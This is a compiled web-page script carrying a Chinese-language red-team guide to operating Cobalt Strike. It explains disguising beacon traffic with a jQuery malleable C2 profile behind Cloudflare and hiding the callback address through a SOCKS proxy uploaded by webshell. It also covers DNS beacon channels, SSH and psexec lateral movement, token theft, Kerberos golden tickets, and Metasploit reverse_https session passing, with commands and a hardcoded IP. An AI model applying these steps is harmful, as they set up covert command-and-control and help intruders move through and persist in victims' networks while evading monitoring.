import{_ as r}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as i,c as p,a as e,b as a,d as t,e as s,r as l}from"./app.91785a79.js";const o="/assets/clip_image001.06a46846.png",d="/assets/clip_image002.24bb069b.png",c="/assets/clip_image003.e868100e.png",h="/assets/clip_image004.df1d9b5f.png",m="/assets/clip_image005.3eb441e6.png",b="/assets/clip_image006.8d79f0c9.png",u="/assets/clip_image001-1669049490862.79ee71b1.png",g="/assets/clip_image008.4ca6480e.png",v="/assets/clip_image009.7114979a.png",k={},f=s(`<h2 id="团队服务器搭建" tabindex="-1"><a class="header-anchor" href="#团队服务器搭建" aria-hidden="true">#</a> 团队服务器搭建</h2><h3 id="_1-生成ssl证书" tabindex="-1"><a class="header-anchor" href="#_1-生成ssl证书" aria-hidden="true">#</a> 1）生成SSL证书</h3><p>证书直接使用Cloudflare提供的证书</p><p>使用默认配置生成证书和秘钥后（<strong>server.pem server.key</strong>），复制粘贴到服务器上</p><p><strong>生成证书</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 这里cdn.publab.cf是我的域名</span>
openssl pkcs12 <span class="token parameter variable">-export</span> <span class="token parameter variable">-in</span> server.pem <span class="token parameter variable">-inkey</span> server.key <span class="token parameter variable">-out</span> cdn.publab.cf.p12 <span class="token parameter variable">-name</span> cdn.publab.cf <span class="token parameter variable">-passout</span> pass:999000



<span class="token comment">#生成CS证书</span>
keytool <span class="token parameter variable">-importkeystore</span> <span class="token parameter variable">-deststorepass</span> <span class="token number">999000</span> <span class="token parameter variable">-destkeypass</span> <span class="token number">999000</span> <span class="token parameter variable">-destkeystore</span> cdn.publab.cf.store <span class="token parameter variable">-srckeystore</span> cdn.publab.cf.p12 <span class="token parameter variable">-srcstoretype</span> PKCS12 <span class="token parameter variable">-srcstorepass</span> <span class="token number">999000</span> <span class="token parameter variable">-alias</span> cdn.publab.cf
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>生成keystore放在CS的根目录下，确保keystore文件名与密码和<strong>https-certificate</strong>中设置的一致。Cloudflare默认的TLS配置为灵活，由于之前使用了Cloudflare给原服务器发的证书，我们可以改成完全（严格）提高安全性。</p><p>创建Cloudflare规则，不代理js请求（缓存级别-绕过）</p><h3 id="_2-配置profile" tabindex="-1"><a class="header-anchor" href="#_2-配置profile" aria-hidden="true">#</a> 2）配置Profile</h3><p>需要使用Profile让Beacon和Teamserver之间的交互看起来尽可能像正常的流量</p>`,10),_={href:"https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.3.profile",target:"_blank",rel:"noopener noreferrer"},x=s(`<p>根据我们的域名对Profile进行修改，以便能够上线HTTP/HTTPS BEACON；</p><p>需要修改的内容主要有四处：</p><p>1、https-certificate块中更改keystore和密码</p><p>2、http-stager 块中的Host Header</p><p>3、http-get 块中的Host Header</p><p>4、http-post 块中的Host Header</p><p>使用CS自带的 c2lint 对profile语法进行检查，没有报错就行</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>./c2lint jquery.profile
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>需要更改Profile中的响应头配置，其中的</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>header <span class="token string">&quot;Content-Type&quot;</span> <span class="token string">&quot;application/javascript; charset=utf-8&quot;</span><span class="token punctuation">;</span>
<span class="token comment">#改为</span>
header <span class="token string">&quot;Content-Type&quot;</span> <span class="token string">&quot;application/*; charset=utf-8&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>即可正常执行命令回显</p><h3 id="_3-启动团队服务器" tabindex="-1"><a class="header-anchor" href="#_3-启动团队服务器" aria-hidden="true">#</a> 3）启动团队服务器</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">nohup</span> ./teamserver VPS-IP cs@admin.886 jquery.profile <span class="token operator">&amp;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="回连ip隐藏" tabindex="-1"><a class="header-anchor" href="#回连ip隐藏" aria-hidden="true">#</a> 回连IP隐藏</h2><p>cs4.5的监听器可以设置socks代理（可以直接使用公开socks上线,但是GWF肯定能记录）</p><p>1）用webshell在目标机器上上传一个本地socks代理工具</p><p>2）监听器代理填写127.0.0.1</p><p>3）目标机器上木马的回连地址会显示为IPV4回连地址，且流量监测设备不会抓取存储回连地址的流量</p><p><img src="`+o+'" alt="0  资 源 监 视 器  文 件 旧 监 视 器 （ M ） 帮 助 （ H ）  概 述 CPU  0 名 称  囗  vmware-hOS—  匚 》 Feishu.exe  匚 》 Feishu.exe  囗  vmware.exe  匚 》 Feishu.exe  囗 system  囗 svchost.exe 仁  囗 svchost.exe 仁  网 络 活 动  TCP 连 接  按 sbl .exe 筛 选  名 称  sbl.exe  内 存  PID  7476  10804  17672  19 8  4  55  2908  101 亡 贮  17  磁 盘 网 络  发 法 （ 字 节 ／ 钞 ）  148  126  30  25  9  1920 主 103  接 字 节 ／ 钞 ）  30  26  0  43  17  本 地 端 口  1 188  总 数 （ 字 节 ／ 钞 ）  178  30  26  ， 228 Kbps 网 络 《 / 0  220 ． 177 ． 172 ． 10  苤 0 ％ 网 络 使 用 率  远 程 端 口  1 0  数 包 丢 矢 一  延 迟 时 间 (ms) " loading="lazy"></p><p><img src="'+d+`" alt="CPU  sb5.exe  O GWCtl Srv  C) clash-win6•L  C) Feishuexe  (D Clash for WL  C) Feishu.exe  O System  TCP  sb5.exe  sb5.exe  PID  15668  19148  6176  15744  16692  15368  17672  4  PID  15668  Fug  74  1 A43  213  36  29  28  18  6,248  12  218  7  52  17  556  7,691  952  431  43  81  45  18  4 Kbps I/O  0% " loading="lazy"></p><h2 id="常用功能" tabindex="-1"><a class="header-anchor" href="#常用功能" aria-hidden="true">#</a> 常用功能</h2><h3 id="host-file" tabindex="-1"><a class="header-anchor" href="#host-file" aria-hidden="true">#</a> Host File</h3><p>托管主机文件</p><p>Attacks-&gt; Web Drive-by -&gt; Host File</p><p>选择要托管的文件，选择任意URL，然后选择文件的mime类型</p><h3 id="内网主机发现-c段arp" tabindex="-1"><a class="header-anchor" href="#内网主机发现-c段arp" aria-hidden="true">#</a> 内网主机发现（C段ARP）</h3><p>在会话列表视图中，右键获得的初始权限，扫描内网存活的主机和端口</p><p>[beacon] -&gt; Explore -&gt; Port Scanner</p><p>扫描到的存活主机会在<strong>targets</strong>中列出，并且可自己标记系统类型，查看目标开启的服务。</p><h3 id="上线ssh主机" tabindex="-1"><a class="header-anchor" href="#上线ssh主机" aria-hidden="true">#</a> 上线SSH主机</h3><p>1、切换到targets视图，添加一个目标</p><p>2、右键这个新加的目标<strong>Login-&gt; ssh</strong>即可让目标通过ssh上线，(需要用户名和密码)</p><h3 id="数据透视监听器-中转" tabindex="-1"><a class="header-anchor" href="#数据透视监听器-中转" aria-hidden="true">#</a> 数据透视监听器（中转）</h3><p>数据透视监听器可以创建绑定到信标 (<strong>beacon</strong>) 或<strong>SSH会话</strong>的监听器。</p><p>这样可以创建新的反向会话，而无需与命令和控制基础结构进行更直接的连接。</p><p>[beacon]-&gt; Pivoting-&gt; Listener</p><p>接下来可以在<strong>targets</strong>视图中选择一个目标去<strong>psexec</strong>上线</p><h3 id="make-token" tabindex="-1"><a class="header-anchor" href="#make-token" aria-hidden="true">#</a> Make Token</h3><p>[beacon] -&gt; Access -&gt; Make Token</p><p>该对话框显示<strong>Cobalt Strike</strong>的凭据，并将所选凭据转换为令牌</p><h3 id="golden-ticket-金票" tabindex="-1"><a class="header-anchor" href="#golden-ticket-金票" aria-hidden="true">#</a> golden-ticket 金票</h3><p>生成<strong>Kerberos</strong>黄金票据，伪造域管理员权限。</p><p>[beacon] -&gt; Access -&gt; Golden Ticket</p><p>黄金票据需要以下四项信息</p><ol><li>要伪造票据的用户</li><li>要伪造票据的域</li><li>域的 <strong>SID</strong></li><li>域控制器中<strong>krbtgt</strong>用户的<strong>NTLM hash</strong></li></ol><h2 id="dns信道" tabindex="-1"><a class="header-anchor" href="#dns信道" aria-hidden="true">#</a> DNS信道</h2><h3 id="数据通道" tabindex="-1"><a class="header-anchor" href="#数据通道" aria-hidden="true">#</a> 数据通道</h3><p>模式dns-txt是DNS TXT记录数据通道；默认值为DNS TXT记录数据通道。</p><p>模式dns是DNS A记录数据通道；使用信标的mode命令更改当前信标的数据通道。</p><h3 id="操作步骤" tabindex="-1"><a class="header-anchor" href="#操作步骤" aria-hidden="true">#</a> 操作步骤</h3><p>1、c2服务器关闭53端口的服务</p><p>如果开着防火墙要放行53端口</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">lsof</span> <span class="token parameter variable">-i</span> :53
systemctl stop systemd-resolved.service
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>2、在域名解析记录中，配一条A记录指向 teamserver 的IP</p><p>3、再配1条或多条NS记录用来做隧道，域名指向A记录（域名）</p>`,55),S={href:"http://xn--cs-lg6cs42w.xx.info",target:"_blank",rel:"noopener noreferrer"},y=s('<p><img src="'+c+`" alt="MX  NS  NS  cs.c  Linfo.  .info.  600  600  600  SSL " loading="lazy"></p><p>在我们的 C2-VPS 执行以下命令监听 UDP53 端口，在任意一台机器上执行 nslookup ns记录</p><p>如果有查询数据，证明配置有效</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>tcpdump <span class="token parameter variable">-n</span> <span class="token parameter variable">-i</span> eth0 udp dst port <span class="token number">53</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="`+h+'" alt="" loading="lazy"></p><p>4、listener 选择Beacon DNS，DNS-Host都填NS记录</p><p><img src="'+m+'" alt="New Listener  Create a listener.  Name:  Payload  DNS CC  aeacon DNS  Payload Options  DNS Hosts:  nsl orangeb,v into  ns2_orangetw_into  x  -e  DNS Host (Stager): nsl  DNS port (Bind): " loading="lazy"></p><p>5、只有在有任务可用时，DNS Beacon才会激活，使用checkin命令来请求DNS信标激活</p><p><img src="'+b+`" alt="Cobalt Strike  Cobalt Strike View Attacks Reporting Help  external  Event Log  DNS CC  dns  listener  txt  host  nsl _  user  &#39;_into  computer  note  bindto  beacons  nsl _  process  _into, ns2_r  pid  profile  arch  last  lgs  x  Listeners  internal A  x  payload  windows/öeacon  dns/reverse  Into  Add  Edit  port  Remove  Restart " loading="lazy"></p><h2 id="与metasploit联动" tabindex="-1"><a class="header-anchor" href="#与metasploit联动" aria-hidden="true">#</a> 与Metasploit联动</h2><h3 id="cs会话传递到msf上" tabindex="-1"><a class="header-anchor" href="#cs会话传递到msf上" aria-hidden="true">#</a> CS会话传递到MSF上</h3><p>1、MSF监听</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>use exploit/multi/handler
<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.104   <span class="token comment">#MSF的IP</span>
<span class="token builtin class-name">set</span> LPORT <span class="token number">8080</span>
run
<span class="token comment">#[*] Started HTTP reverse handler on http://192.168.0.104:8080</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2、CS上创建外部监听器</p><p><img src="`+u+'" alt="clip_image001" loading="lazy"></p><p>3、CS上派生到外部监听器（MSF）</p><p>[beacon] -&gt; Spawn</p><p><img src="'+g+'" alt="Event Log  nttp_mst  one- Iner  pviov  x  aeacon X  payload  Listeners  x  host  p  Choose a payload  port  8080  reverse_tcp  nttp/reverse  nttp/reverse  bindto  beacons  windows,&#39;toreign/reverse nttp  acon  reverse  profile  default  default  x  windows/beacon_reverse_tcp  host  pviov  nttp CC  one-liner  http_mst  payload  windows/öeacon  windows/beacon  windows/öeacon  nttp  nttp  windows/toreign/reverse nttp  port  801  8080 " loading="lazy"></p><h3 id="msf会话传递到cs上" tabindex="-1"><a class="header-anchor" href="#msf会话传递到cs上" aria-hidden="true">#</a> MSF会话传递到CS上</h3><p>1、CS上创建一个https监听器</p><p><img src="'+v+`" alt="New Listener  Create a listener.  x  Name:  Payload  nttps_get_mst  aeacon HTTPS  Payload Options  HTTPS Hosts:  HTTPS Host (Stager): F  Profile:  HTTPS port (C2):  HTTPS port (Bind):  HTTPS Host Header:  HTTPS proxy:  default " loading="lazy"></p><p>2、MSF先把会话调到后台</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>meterpreter <span class="token operator">&gt;</span> background
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>3、MSF调用 <strong>payload_inject</strong> 模块</p><p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 和端口</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>use exploit/windows/local/payload_inject
<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_https
<span class="token builtin class-name">set</span> lhost <span class="token number">119.45</span>.153.4
<span class="token builtin class-name">set</span> lport <span class="token number">443</span>
<span class="token builtin class-name">set</span> DisablePayloadHandler True
<span class="token builtin class-name">set</span> session <span class="token number">1</span>
run
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,26);function C(P,T){const n=l("ExternalLinkIcon");return i(),p("div",null,[f,e("p",null,[a("下载："),e("a",_,[a("https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.3.profile"),t(n)])]),x,e("p",null,[a("NS记录的作用是想知道ns1.xx.info这个域名的IP，"),e("a",S,[a("去问cs.xx.info"),t(n)])]),y])}const w=r(k,[["render",C],["__file","CobaltStrike.html.vue"]]);export{w as default};
